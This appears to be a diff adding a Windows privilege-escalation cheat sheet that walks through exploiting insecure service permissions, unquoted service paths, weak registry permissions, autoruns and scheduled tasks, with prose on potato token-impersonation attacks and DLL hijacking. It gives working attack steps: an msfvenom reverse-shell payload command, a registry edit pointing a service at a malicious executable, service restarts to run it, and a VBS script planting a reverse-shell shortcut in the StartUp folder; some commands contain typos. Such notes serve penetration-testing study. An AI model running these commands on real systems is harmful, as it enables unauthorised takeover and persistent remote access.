@@ -1,0 +1,243 @@
+Insecure Service Permission:--->
+============================
+
+Manual Methods:--
+
+===> Identify Services: List all services and their paths:
+
+   PS:> wmic service get name,displayname,pathname,startmode
+
+===> Check Permissions:
+
+   PS:> sc qc "ServiceName" [ * for all]
+
+===> Verify Permissions:
+
+   PS:> icals "C:\path\to\service.exe"
+
+===> Exploit:
+
+   If you have write permission, replace the service executable with a malicious one.
+   Restart the service to execute you payload:
+
+   PS:> net stop "ServiceName" && net start "ServiceName"
+
+
+AUTOMATED METHODS:---->
+
+using powerup.ps1:
+
+ ===> Bypass the execution policy:
+
+   PS:> Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
+
+ ===> Load and Execute the script:
+
+   PS:> Import-Module .\PowerUp.ps1
+   PS:> Invoke-AllChecks
+
+####================####======================####
+
+Service Exploits- Unquoted Service Path:--->
+----------------------------------------
+
+Manual Method to find and exploit:
+
+ ===> Identify Services:
+
+   PS:> wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+ ===> Check for Unquoted Paths:
+
+   Look for service path that contain spaces but are not enclosed in quotation marks.
+
+ ===> Verify Permissions:
+
+   Use the icacls command to check permissions on the service executable:
+  
+   PS:> icals "C:\path\to\service.exe"
+	
+NOTE:---> Ensure you have write permission to one of the directories in the path.
+
+---- OR ----
+
+Use this command to list all services:
+
+  PS:> sc query state=all
+
+## Check Permission with accesschk.exe
+
+accesschk.exe /accepteula -uwcqv *
+
+  Find service path location:
+
+   PS:> sc qc "service name"
+
+
+###=================####==================####
+
+Weak Registry Permissions:--->
+==========================
+
+Manual Method:
+
+===> Use the reg query command to list registry keys associated with services:
+
+   
+   .\accesschk.exe -uwcqv Users * | findstr /i "write" OR "rw"
+
+
+   PS:> reg query HKLM\SYSTEM\CurrentControlSet\Services
+
+===> Check Permissions: using icals command to check permission on the registry keys:
+
+   PS:> icals "HKLM\SYSTEM\CurrentControlSet\ServiceName"
+
+If you have write permissions, you can modify the registry key to point to a malicious executable, change imagepath value to your payload.
+
+# EXPLOIT:--->
+
+===> Create a malicious executable:
+
+   $ msfvenom -p windwos/x64/shell_reverse_tcp LHOST=IP LPORT=Port -f exe -o mal.exe
+
+===> Modify the registry key to point to the malicious execuatable:
+
+  PS:> reg add "HKLM\SYSTEM\CurrentControlSet\Services\ServiceName" /v ImagePath /t REG_EXPAND_SZ /d "C:\malicous.exe" /f
+
+===> Restart the service to execute your payload:
+
+  PS:> net stop "ServiceName" && net start "ServiceName"
+
+
+Automated Method:
+-----------------
+
+Using PowerUp.ps1 tool OR WinPEAS
+
+PS:> Import-Module .\PowerUp.ps1
+PS:> Invoke-AllChecks
+
+
+OR 
+
+winpeas.exe quiet servicesinfo
+
+
+=========================================================================
+
+Service Exploits - Insecure Service Executables:---->
+================================================
+
+accesschk.exe -uwcqv user *
+
+
+================================================
+
+Registry - AutoRun :---->
+===================
+
+Check Manually using reg query:
+
+
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+
+Automated Methods:--->
+
+use autoruns sysiternals tool
+
+PS:> autorunsc.exe -a * -c
+
+OR
+
+using powerup.sp1 tool:
+
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+
+
+===================================================
+
+## Scheduled Tasks :------>
+
+use the schtasks command to list all scheduled tasks:
+
+schtasks /query /fo LIST /v
+
+OR
+using powerup.ps1 tool
+
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+
+Create a shortcut in startup folder...
+
+PS:> type CreateShortcut.vbs
+
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+
+
+create a new shortcut to your reverse.exe executable in the StartUp directory:
+
+PS:> cscript C:\PrivEsc\CreateShortcut.vbs
+
+=================================================
+
+## Token Impersonation — Rogue Potato :---->
+--------------------------------------
+
+Token impersonation, in the context of cybersecurity, refers to a technique where an attacker takes on the identity of another user or process by using their security tokens. Security tokens are like digital keys that grant access to systems and resources.
+
+PrintSpoofer is a specific tool that exploits this concept. It allows an attacker to impersonate a user with higher privileges (like an administrator) by using their token. This can enable the attacker to perform actions that they normally wouldn't be able to do, such as accessing sensitive information or executing commands with elevated permissions.
+
+In simpler terms, think of token impersonation as someone using a stolen key to enter a restricted area. PrintSpoofer is a tool that helps them do just that, making it easier for attackers to gain unauthorized access to systems.
+
+
+
+    History of Potato Attack ---->
+    
+
+    There are a lot of different potatoes used to escalate privileges from Windows Service Accounts to NT AUTHORITY/SYSTEM.
+
+    Hot, Rotten, Lonely, Juicy and Rogue are family of potato exploits. To understand more about these attacks click on the type of attack and read the blog from the exploit devs.
+
+    TL;DR — Every potato attack has it’s own limitations
+    If the machine is >= Windows 10 1809 & Windows Server 2019 — Try Rogue Potato
+    If the machine is < Windows 10 1809 < Windows Server 2019 — Try Juicy Potato
+
+
+
+==========####=======================###============
+
+DLL Hijacking ?
+
+A DLL file, which stands for "Dynamic Link Library," is a type of file used in Windows operating systems. Think of it as a toolbox that contains a collection of tools (functions and procedures) that different programs can use.
+
+Here’s a simple breakdown:
+
+    Shared Resources: Instead of each program having its own copy of the same tools, they can all use the same DLL file. This saves space and makes programs run more efficiently.
+
+    Modularity: If a program needs to perform a specific task, like printing or accessing the internet, it can call the functions in the DLL instead of having that code written directly into the program. This makes the program smaller and easier to update.
+
+    Updates: If a DLL file is updated, all programs that use it can benefit from the improvements without needing to be reinstalled.
+
+
+### DLL Hijacking :---->
+
+In a DLL hijacking attack, the attacker places a malicious DLL file in a location where the program will look for it before the legitimate DLL. This can happen if the program is not careful about where it searches for DLLs.
+
+Execution: When the program starts, it loads the malicious DLL instead of the intended one. This can allow the attacker to execute harmful code, steal information, or take control of the system.
+
+Prevention: To protect against DLL hijacking, developers can use secure coding practices, such as specifying the full path to the DLLs they use, and users can ensure their software is up to date and from trusted sources. 
+
+
+
+
